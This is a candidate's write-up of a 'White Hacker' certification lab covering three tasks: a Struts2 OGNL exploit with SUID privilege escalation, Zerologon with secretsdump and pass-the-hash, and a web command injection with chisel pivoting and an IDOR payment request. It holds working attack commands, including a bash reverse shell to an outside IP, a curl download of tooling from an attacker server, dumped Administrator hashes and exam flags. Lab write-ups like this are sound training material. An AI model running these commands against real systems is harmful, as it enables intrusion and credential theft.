# Report on the Results of the Certification Test **"White Hacker"**

**Candidate:** Diffouo Fopa Esdras                                                                                                                       **Portfolio Website**: [esdrasfopa.vercel.app](https://esdrasfopa.vercel.app) , [Positive Hack Camp Github Repo](https://github.com/IamdLite/Positive-Hack-Bootcamp-2025)                                                                                                                                           **My Hacking Community**: [eOfbit Society](https://t.me/endOfilebitsociety) , **Medium blog**: [iamdlite](https://iamdlite.medium.com/)                                                                                                         **Email:** diffouo44@gmail.com                                                                                                                                                                     **Date:** 14/09/2025 
**Version:** 1.0

[TOC]

---

# Executive Summary
This document reports the results of the certification test **“White Hacker”** executed by Diffouo Fopa Esdras. The candidate completed a set of laboratory tasks designed to validate offensive security skills. The report documents the steps taken, tools used, commands executed, outputs captured, technical commentary, screenshots, and artifacts.

---

# Introduction
This report provides a clear, reproducible account of the candidate’s actions during the certification test *"White Hacker"*. Deliverables included:
- Step-by-step descriptions of actions
- Technical commentary and rationale
- Executed commands and captured outputs
- Screenshots and artifacts (flags, session logs)

---

# Test Objectives
The objective of the test is to solve a number of tasks located in a dedicated lab environment. The candidate must demonstrate knowledge and skills typical for a White Hacker and achieve the goals described in each task.

---

# Execution of Test Tasks

## 4.1 Task 1 — Linux
**Target IP:** `10.10.0.40`

We were tasked to hack the server, escalate our privileges and read a flag from /root.

### 4.1.1 Reconnaissance & Discovery

**Tool used:** `nmap`  
**Command executed:**

```bash
nmap -sCV 10.10.0.40 # Quick scan to get running services and their versions on common ports
```

![Discovery and reconnaissance Linux](/home/iamdlte/Desktop/PHC/PHC-git/resources/reporting/windows_task_1.png)

We see that `Apache Tomcat/Coyote JSP engine 1.1` is running `Struts2` on port 80. 

### 4.1.2 OSINT and Exploitation

**Tool used:** `metasploit framework`  

After a quick OSINT search, an exploit for the software version was found and weaponized using metasploit.

```bash
msfconsole -qx "use exploit/multi/http/struts2_content_type_ognl; set RHOSTS 10.10.0.40; set RPORT 80; set TARGETURI /; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST 100.100.75.242; set LPORT 4444; exploit"
```

As expected, we obtained a shell.

![](/home/iamdlte/Desktop/PHC/PHC-git/resources/reporting/linux_task_2.png)

Our shell is a low-privileged `tomcat` user shell though. A good SUID binary search might show us the way to elevate to root.

`find / -perm -u=s -type f 2>/dev/null`

Out of the results obtained, `/usr/bin/find` was the most interesting.

 So [GTFObins](https://gtfobins.github.io/gtfobins/find/) hinted us on an interesting command that could proclaim us **root** ! `/usr/bin/find . -exec /bin/bash -p \;`

![linux_task_3](/home/iamdlte/Desktop/PHC/PHC-git/resources/reporting/linux_task_3.png)

And it worked, just like magic... **`flag: cybered{ec78de74746e616cc5b2ef86999db634}`**

## 4.2 Task 2 - Windows

**Target IP:** `10.10.0.42`

We were tasked to hack the host, open an archive on the admin's desktop. The archive was to be cracked using the [realyBest](https://github.com/empty-jack/YAWR/blob/master/brute/passwords/realyBest.txt) dictionary.

### 4.2.1 Reconnaissance and Discovery

**Tools used:** ` impacket-DumpNTLMInfo.py `

An attempt to dump the NTLM information of the target was made using an impacket library.

**Command executed:**

```bash
DumpNTLMInfo.py 10.10.0.42
```

![](/home/iamdlte/Desktop/PHC/PHC-git/resources/reporting/windows_task_1.png)

The **Null Session** flag set to **True** means that null sessions are allowed. This confirms that the machine is   a Domain Controller `DC1`  running a version of Windows vulnerable to **Zerologon(CVE-2020-1472)** if not patched. This vulnerability allows unauthenticated privilege escalation.

### 4.2.2 OSINT and Exploitation

**Tools Used**: `metasplot framework, impacket-secretsdump.py, impacket-wimiexec.py hashcat, zip2john `

Metasploit contains the *zerologon* exploit, and since we have noting to lose, let's try it out, just in case...

```bash
msfconsole -x "use auxiliary/admin/dcerpc/cve_2020_1472_zerologon; set RHOSTS 10.10.0.42; set NBNAME DC1; run"
```

![](/home/iamdlte/Desktop/PHC/PHC-git/resources/reporting/windows_task_2.png) 

Magic Magic, **it worked** ! 

What the *zerologon* exploit does is that it resets the machine account password for `DC1$` to an empty password. This enables us to extract credentials for users like *Administrator*, and guess what ? we could effortlessly get a privileged shell right-in!

We started by extracting the *Administrator* 's password hash with `impacket-secretsdump`

```bash
➜  PHC secretsdump.py 'SANDBOX/DC1$@10.10.0.42' -just-dc -no-pass | grep -i 'administrator'

/home/linuxbrew/.linuxbrew/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Administrator:500:aad3b435b51404eeaad3b435b51404ee:04e3495f5762e65f344c6862a8bb0fe8:::
Administrator:aes256-cts-hmac-sha1-96:7a610f77d5c1ea57c3efc565b3874c7b03f197d6f96042f3a4ac8cea3943faee
Administrator:aes128-cts-hmac-sha1-96:633e9dc1a215797c381fe5f614b9818e
Administrator:des-cbc-md5:070bdf2598b0b346

```

Then used the hash to login into the *Administrator*'s account using `impacket-wimiexec.py`

```bash
➜  PHC wmiexec.py SANDBOX/Administrator@10.10.0.42 -hashes aad3b435b51404eeaad3b435b51404ee:04e3495f5762e65f344c6862a8bb0fe8
```

![](/home/iamdlte/Desktop/PHC/PHC-git/resources/reporting/windows_task_3.png)

The zipped and password-protected flag was found in the Desktop as announced in the task description. To crack the password, we downloaded the `flag.zip` to our local machine using the command `lget flag.zip`.

We then create a super-cozy script that would use zip2john and hashcat to crack the password before we can blink.

```bash
➜  PHC john-the-ripper.zip2john flag.zip | awk -F: '{print $2}' > hash.txt && hashcat -m 17210 -a 0 hash.txt ./rockyou.txt
```

After a quick failure, we remembered that we needed to identify the type of hash and code  dumped by `zip2john` in `hash.txt` using the command `hashcat --identify hash.txt` which turned out to be **17210** for **pkzip** hashes.

![](/home/iamdlte/Desktop/PHC/PHC-git/resources/reporting/windows_task_4.png)

**NB** The password (*abc123*) wasn't present in the [realyBest](https://github.com/empty-jack/YAWR/blob/master/brute/passwords/realyBest.txt) wordlist recommended by the task. So  `Rockyou.txt` **rocked again !!** `flag: cybered{d2d399ada068c5619681c395b3a3a265} `

## 4.3 Task 3 - Web Task

**Target IP:** `10.10.0.55`

We were tasked to firstly penetrate into the internal network, and then find a vulnerability in the 'web' service, and exploit it and gain the flag.

### 4.3.1 Reconnaissance and Discovery

**Tools used:** ` nmap, netcat`

We found using nmap the ***book search*** service running on port 80 and we visit it on the browser. After some trials-and-errors, we found the command that could exploit its remote code execution vulnerability.

 ```bash
 1984; bash -c 'bash -i >& /dev/tcp/62.84.113.48/4444 0>&1'
 ```

![](/home/iamdlte/Desktop/PHC/PHC-git/resources/reporting/web_task_1.png)

At the same time, our netcat listener caught a shell. `nc -nlvp 4444`.

### 4.3.2 OSINT and Exploitation

***Tools Used** : `chisel, burpsuite`

Since the  task speculated the need for pivoting, we downloaded the **chisel** right away from our local python http server and made it executable.

```bash
➜  PHC nc -nlvp 4444                                                     
Listening on 0.0.0.0 4444                                        
Connection received on 10.10.0.55 47356                                  
bash: cannot set terminal process group (1): Inappropriate ioctl for d           
bash: no job control in this shell                         
www-data@fhmbsgsrhqscm870bd1s:/var/www/html$ curl http://162.84.113.48:8000/chisel -o chisel                    
www-data@fhmbsgsrhqscm870bd1s:/var/www/html$ cat /etc/hosts                    
cat /etc/hosts                                                         
# Your system has configured 'manage_etc_hosts' as True.                   
# As a result, if you wish for changes to this file to persist                
# then you will need to either                                               
# a.) make changes to the master file in /etc/cloud/templates/hosts.debian.tmpl 
# b.) change or remove the value of 'manage_etc_hosts' in                         
#     /etc/cloud/cloud.cfg or cloud-config from user-data                         
#     
127.0.1.1 fhmbsgsrhqscm870bd1s.auto.internal fhmbsgsrhqscm870bd1s    
127.0.0.1 localhost
# The following lines are desirable for IPv6 capable hosts
::1 localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

192.168.29.56 web
www-data@fhmbsgsrhqscm870bd1s:/var/www/html$ chmod +x chisel
chmod +x chisel

```

We then used *chisel* to pivot and be able to access the internal network IP `192.168.29.56`  found in `/etc/hosts` from our local machine.

```bash
[On Local Machine]
./chisel server -p 8989 --reverse

[On Web shell]
./chisel client 62.84.113.48:8989 R:8080:192.168.29.56:80 
```

![](/home/iamdlte/Desktop/PHC/PHC-git/resources/reporting/web_task_2.png)

Now tat we could access the internal service, we created and account, proxied the session through burp and discovered some interesting javascript in the page source of a logged in user.

![](/home/iamdlte/Desktop/PHC/PHC-git/resources/reporting/web_task_4_1.png)

What this script does is that it attempts to make a payment with a given user ID. Our *user_id* is 3, and we are broke,  but that we can change. So we crafted a POST request that matched the exposed script. Only that, we tried to check if the *user_id=1* had some **cash** left in his account :)

```bash
POST /api/payments HTTP/1.1
Host: 192.168.29.56
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://192.168.29.56/api/login
Content-Type: application/json
Content-Length: 74
Origin: http://192.168.29.56
Connection: keep-alive
Cookie: session = eyJleHBpcmVzIjp7IiBkIjoiTW9uLCAxNSBTZXAgMjAyNSAxNTowNDo0NSBHTVQifSwidXNlcl9pZCI6M30.aMbZjQ.2eYGtLZsWvoEYTu5KfsRO206WCc
Upgrade-Insecure-Requests: 1
Priority: u=0, i

{"currency":"RUB","user_id":1,"filter":[],"pages":{"page":1,"amount":100}}

```

**Bingo !** - we were rewarded with a **`flag: cybered{4738f60ac8cf6c5da65e51ea1e62b530}`**

![](/home/iamdlte/Desktop/PHC/PHC-git/resources/reporting/web_task_4.png)

# Conclusion

All tasks were solved in close to **an hour** out of **8!!** Reporting took about 2 hours+ (most of the time trying to replay steps to take screenshots or so). So, there was still more than 4 hours left. A possible explanation could be that this was my second attempt. Two tasks (*Linux* and *web*) were different from the ones in my first attempt but the procedures to solve were close. Worth mentioning that, in the first attempt, I solved the *Linux* and *windows* tasks in less than two hours, and got stuck in the final step of the *web* task for 3 hours trying to exploit **a path traversal vulnerability** to find a flag which apparently was in the current directory  and not in `../../../../../***/root/flag.txt` as I wasted my time doing. That was an awful way to fail an exam, yeah. However, it was interesting to take the exam and learn during the camp. My only comment will be that the appalling English language typos on some task descriptions and course/lab content didn't go unnoticed, maybe it is high time you have a technical writer :).

